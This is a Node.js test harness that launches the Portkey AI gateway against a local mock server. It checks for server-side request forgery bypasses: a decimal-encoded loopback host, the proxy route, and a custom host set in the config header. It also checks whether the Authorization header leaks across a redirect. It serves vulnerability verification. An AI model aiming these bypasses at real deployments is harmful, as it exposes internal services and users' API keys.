import http from "node:http";
import { spawn } from "node:child_process";
import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const packageDir = path.join(__dirname, "package");
const gatewayPort = 8787;
const mockPort = 18080;
const gatewayBase = `http://127.0.0.1:${gatewayPort}`;
const mockBaseAlt = `http://2130706433:${mockPort}`;
const mockBaseNormal = `http://127.0.0.1:${mockPort}`;
const outDir = path.join(__dirname, "results");

const requests = [];

function startMock() {
  const server = http.createServer(async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const rawBody = Buffer.concat(chunks).toString("utf8");
    requests.push({
      at: new Date().toISOString(),
      method: req.method,
      url: req.url,
      headers: req.headers,
      body: rawBody,
    });

    if (req.url.includes("redirect-to-alt")) {
      res.writeHead(302, {
        location: `${mockBaseAlt}/redirected-from-allowed-host`,
      });
      res.end();
      return;
    }

    res.writeHead(200, { "content-type": "application/json" });
    res.end(
      JSON.stringify({
        id: "chatcmpl-local-mock",
        object: "chat.completion",
        created: Math.floor(Date.now() / 1000),
        model: "local-mock",
        choices: [
          {
            index: 0,
            message: { role: "assistant", content: "mock ok" },
            finish_reason: "stop",
          },
        ],
        usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
      }),
    );
  });

  return new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(mockPort, "127.0.0.1", () => resolve(server));
  });
}

function startGateway() {
  const command = process.execPath;
  const args = [path.join(packageDir, "build", "start-server.js"), `--port=${gatewayPort}`, "--headless"];
  const env = {
    PATH: process.env.PATH,
    Path: process.env.Path,
    SystemRoot: process.env.SystemRoot,
    COMSPEC: process.env.COMSPEC,
    TEMP: process.env.TEMP,
    TMP: process.env.TMP,
    USERPROFILE: process.env.USERPROFILE,
    NODE_ENV: "production",
    NO_PROXY: "127.0.0.1,localhost,2130706433",
    TRUSTED_CUSTOM_HOSTS: "allowed.example.com",
  };
  const child = spawn(command, args, { cwd: packageDir, env, stdio: ["ignore", "pipe", "pipe"] });
  const logs = [];
  child.stdout.on("data", (data) => logs.push(data.toString()));
  child.stderr.on("data", (data) => logs.push(data.toString()));
  return { child, logs };
}

async function waitForGateway(logs) {
  const deadline = Date.now() + 20000;
  let lastError = "";
  while (Date.now() < deadline) {
    try {
      const res = await fetch(`${gatewayBase}/`, { signal: AbortSignal.timeout(1000) });
      const text = await res.text();
      if (res.ok && text.includes("AI Gateway")) return;
    } catch (error) {
      lastError = error.message;
    }
    await new Promise((resolve) => setTimeout(resolve, 500));
  }
  throw new Error(`Gateway did not become ready: ${lastError}\n${logs.join("")}`);
}

async function callGateway(name, pathName, headers, body) {
  const before = requests.length;
  let response;
  try {
    const res = await fetch(`${gatewayBase}${pathName}`, {
      method: "POST",
      headers,
      body: JSON.stringify(body),
      signal: AbortSignal.timeout(10000),
    });
    const text = await res.text();
    response = {
      status: res.status,
      body: tryJson(text),
    };
  } catch (error) {
    response = { error: error.message };
  }
  const seen = requests.slice(before);
  return { name, response, mockRequestCount: seen.length, mockRequests: seen };
}

function tryJson(text) {
  try {
    return JSON.parse(text);
  } catch {
    return text;
  }
}

function resetMockLog() {
  requests.length = 0;
}

const body = {
  model: "gpt-4o-mini",
  messages: [{ role: "user", content: "local probe" }],
  stream: false,
};

const clientSecret = "Bearer sk-local-client-forwarded";
const configSecret = "sk-local-config-forwarded";

const tests = [
  {
    name: "normal_route_rejects_alt_loopback_custom_host",
    path: "/v1/chat/completions",
    headers: {
      "content-type": "application/json",
      authorization: clientSecret,
      "x-portkey-provider": "openai",
      "x-portkey-custom-host": mockBaseAlt,
    },
    body,
  },
  {
    name: "proxy_route_reaches_alt_loopback_custom_host",
    path: "/v1/proxy/v1/chat/completions",
    headers: {
      "content-type": "application/json",
      authorization: clientSecret,
      "x-portkey-provider": "openai",
      "x-portkey-custom-host": mockBaseAlt,
    },
    body,
  },
  {
    name: "normal_route_rejects_config_custom_host",
    path: "/v1/chat/completions",
    headers: {
      "content-type": "application/json",
      "x-portkey-config": JSON.stringify({
        provider: "openai",
        api_key: configSecret,
        custom_host: mockBaseAlt,
      }),
    },
    body,
  },
  {
    name: "proxy_route_uses_config_custom_host_and_key",
    path: "/v1/proxy/v1/chat/completions",
    headers: {
      "content-type": "application/json",
      "x-portkey-config": JSON.stringify({
        provider: "openai",
        api_key: configSecret,
        custom_host: mockBaseAlt,
      }),
    },
    body,
  },
  {
    name: "proxy_redirect_preserves_authorization_after_follow",
    path: "/v1/proxy/redirect-to-alt",
    headers: {
      "content-type": "application/json",
      authorization: clientSecret,
      "x-portkey-provider": "openai",
      "x-portkey-custom-host": mockBaseNormal,
    },
    body,
  },
];

let mock;
let gateway;
try {
  await mkdir(outDir, { recursive: true });
  mock = await startMock();
  gateway = startGateway();
  await waitForGateway(gateway.logs);

  const results = [];
  for (const test of tests) {
    resetMockLog();
    results.push(await callGateway(test.name, test.path, test.headers, test.body));
  }

  const report = {
    generatedAt: new Date().toISOString(),
    portkeyPackage: "@portkey-ai/gateway@1.15.2",
    gatewayBase,
    mockBaseNormal,
    mockBaseAlt,
    results,
    gatewayLogs: gateway.logs.join("").slice(-8000),
  };

  const resultPath = path.join(outDir, `portkey-attack-${Date.now()}.json`);
  await writeFile(resultPath, JSON.stringify(report, null, 2));

  console.log(JSON.stringify({ resultPath, summary: summarize(results) }, null, 2));
} finally {
  if (gateway?.child && !gateway.child.killed) gateway.child.kill();
  if (mock) await new Promise((resolve) => mock.close(resolve));
}

function summarize(results) {
  return results.map((result) => {
    const first = result.mockRequests[0];
    return {
      name: result.name,
      gatewayStatus: result.response.status ?? result.response.error,
      mockRequestCount: result.mockRequestCount,
      firstMockUrl: first?.url,
      firstMockAuthorization: first?.headers?.authorization,
      firstMockHost: first?.headers?.host,
    };
  });
}
